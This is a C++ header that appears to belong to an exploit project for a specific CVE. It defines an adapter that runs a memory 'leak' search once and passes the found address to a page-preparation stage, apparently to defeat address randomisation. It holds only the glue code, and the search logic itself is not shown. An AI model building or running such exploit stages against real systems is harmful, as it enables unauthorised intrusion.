#pragma once
/** @file backend/cve_2026_43499/leak/snitch_policy.hpp
 *  The real search, wearing the shape the page preparation asks for.
 *
 *  The preparation polls a policy: start a search, ask whether it has found something, ask
 *  what, reset it. The search itself is a call that runs to a conclusion -- it maps, forks
 *  its cohort, waits, walks and stops -- so this adapter runs it once, on start, and
 *  answers the polls from what came back. That is the honest shape of the two: a poll
 *  cannot drive a search that is one call, and pretending otherwise would put the waiting
 *  inside a function whose name says it is asking a question.
 *
 *  What the preparation gets from it is the address the rule accepted, or nothing. A search
 *  that did not reach its walk reports that it found nothing rather than a zero address
 *  dressed as one, which is the same rule the failure path of the preparation already
 *  follows.
 */
#include <cstddef>
#include <cstdint>

#include "backend/cve_2026_43499/leak/leak_search.hpp"
#include "backend/cve_2026_43499/leak/snitch_run.hpp"
#include "backend/cve_2026_43499/memory/prepare_page.hpp"

namespace ghostlock::backend::cve_2026_43499::leak {
    /** Everything a run needs, kept so that start can do the whole thing at once. */
    struct SnitchPolicyArgs final {
        SnitchSetup setup{};
        RegionInputs region{};
        SnitchPatience patience{};
        std::size_t counter_offset = 0U;
        std::uint32_t *const *words = nullptr;
        std::size_t word_count = 0U;
        ScanStrides strides{};
        ScanRange range{};
        bool sweep_tags = false;
        const std::uint64_t *addresses = nullptr;
        std::size_t address_count = 0U;
    };

    /** The preparation's view of a search: one run, then answers. */
    template <class Seam, class Buckets>
    struct SnitchPolicy final {
        SnitchPolicyArgs args{};
        const Buckets *buckets = nullptr;
        RunOutcome outcome{};
        bool ran = false;

        /** Run the whole search once. Starting twice keeps the first answer: a preparation
         *  that asked for a second search would be asking for a second cohort. */
        [[nodiscard]] bool start(std::size_t) noexcept {
            if (ran) {
                return outcome.status == RunVerdict::Found || outcome.status == RunVerdict::NotFound;
            }
            if (buckets == nullptr) {
                return false;
            }
            outcome = run_snitch_search<Seam>(args.setup, args.region, args.patience, args.counter_offset,
                                              args.words, args.word_count, args.strides, args.range,
                                              args.sweep_tags, *buckets, args.addresses, args.address_count);
            ran = true;
            return outcome.status == RunVerdict::Found || outcome.status == RunVerdict::NotFound;
        }

        /** Whether an address came back. A run that never reached its walk did not find one, and
         *  says so rather than reporting the address of nothing. */
        [[nodiscard]] bool has_collision() const noexcept {
            return ran && outcome.status == RunVerdict::Found && outcome.found != 0U;
        }

        [[nodiscard]] std::uint64_t address() const noexcept { return has_collision() ? outcome.found : 0U; }

        /** Forgetting the answer does not unmap anything: the run's region is the caller's,
         *  and a reset only means the next question starts from nothing. */
        void reset() noexcept {
            outcome = RunOutcome{};
            ran = false;
        }
    };

}  // namespace ghostlock::backend::cve_2026_43499::leak
